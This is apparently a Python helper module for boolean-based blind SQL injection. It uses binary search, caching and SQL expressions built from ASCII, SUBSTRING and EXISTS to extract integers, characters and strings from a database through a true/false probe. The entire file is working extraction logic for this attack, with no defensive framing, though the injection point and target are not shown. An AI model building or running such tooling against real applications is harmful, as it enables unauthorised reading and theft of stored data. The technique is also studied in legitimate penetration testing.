"""Shared binary-search extractors with runaway protection.

v1.2:
  * ProbeCache — thread-safe LRU cache for probe(condition) results.
  * extract_int / extract_char / extract_string accept cache= and cfg=.

Caching is opt-in: if cache is None, behaviour is unchanged.
"""

from __future__ import annotations

import threading
from collections import OrderedDict
from typing import Any, Optional


class ProbeCache:
    """Thread-safe LRU cache for probe(expr, op, value) -> bool.

    Keys are (id(probe), expr, op, value). id(probe) prevents two
    different Prober instances from sharing entries.
    """

    def __init__(self, maxsize: int = 10000) -> None:
        self.maxsize = maxsize
        self._d: "OrderedDict[tuple, bool]" = OrderedDict()
        self._lock = threading.Lock()
        self.hits = 0
        self.misses = 0

    def get(self, key: tuple):
        with self._lock:
            if key in self._d:
                self._d.move_to_end(key)
                self.hits += 1
                return self._d[key]
            self.misses += 1
            return None

    def put(self, key: tuple, value: bool) -> None:
        with self._lock:
            if key in self._d:
                self._d.move_to_end(key)
                self._d[key] = value
                return
            self._d[key] = value
            if len(self._d) > self.maxsize:
                self._d.popitem(last=False)

    def stats(self) -> tuple[int, int]:
        with self._lock:
            return self.hits, self.misses

    def clear(self) -> None:
        with self._lock:
            self._d.clear()
            self.hits = 0
            self.misses = 0


def _cached_probe(probe, expr: str, op: str, value: int,
                  cache: Optional[ProbeCache]) -> bool:
    """Call probe(f'({expr}){op}{value}') with optional caching."""
    if cache is None:
        return bool(probe(f"({expr}){op}{value}"))
    key = (id(probe), expr, op, value)
    hit = cache.get(key)
    if hit is not None:
        return hit
    result = bool(probe(f"({expr}){op}{value}"))
    cache.put(key, result)
    return result


MAX_STR_LEN = 64


def extract_int(probe, expr: str, hi: int = 100000,
                lo: int = 0, debug: bool = False,
                allow_hi: bool = False,
                cfg: Optional[Any] = None,
                cache: Optional[ProbeCache] = None) -> int:
    """Returns the value of `expr` in [lo, hi].

    Raises OverflowError when the result equals `hi` and allow_hi is False.
    """
    low, high = lo, hi
    while low < high:
        mid = (low + high) // 2
        p = _cached_probe(probe, expr, ">", mid, cache)
        if debug:
            print(f"      [int] ({expr[:60]})>{mid} -> {p}")
        if p:
            low = mid + 1
        else:
            high = mid
    if low == hi and not allow_hi:
        raise OverflowError(
            f"extract_int('{expr[:60]}', hi={hi}) hit ceiling"
        )
    return low


def extract_char(probe, string_expr: str, pos: int,
                 substr: str = "SUBSTRING", ascii_fn: str = "ASCII",
                 lo: int = 0, hi: int = 255,
                 debug: bool = False,
                 cfg: Optional[Any] = None,
                 cache: Optional[ProbeCache] = None) -> str:
    sub = f"{substr}({string_expr},{pos},1)"
    code = f"{ascii_fn}({sub})"
    try:
        n = extract_int(probe, code, hi=hi, lo=lo, debug=debug,
                        cfg=cfg, cache=cache)
    except OverflowError:
        return ""
    if n == 0 or n == 255:
        return ""
    return chr(n)


def extract_string(probe, string_expr: str, length: int,
                   substr: str = "SUBSTRING", ascii_fn: str = "ASCII",
                   debug: bool = False,
                   cfg: Optional[Any] = None,
                   cache: Optional[ProbeCache] = None,
                   on_char=None) -> str:
    if length > MAX_STR_LEN:
        print(f"  !! requested length={length} exceeds cap "
              f"{MAX_STR_LEN}; clipping")
        length = MAX_STR_LEN
    out = []
    for i in range(1, length + 1):
        c = extract_char(probe, string_expr, i, substr, ascii_fn,
                         debug=debug, cfg=cfg, cache=cache)
        if c == "":
            if on_char is not None:
                try:
                    on_char(i, length, "", "".join(out))
                except Exception:
                    pass
            break
        out.append(c)
        if debug:
            print(f"      [str] pos={i} char={c!r}")
        if on_char is not None:
            try:
                on_char(i, length, c, "".join(out))
            except Exception:
                pass
    return "".join(out)


def exists(probe, subquery: str) -> bool:
    return probe(f"EXISTS({subquery})")
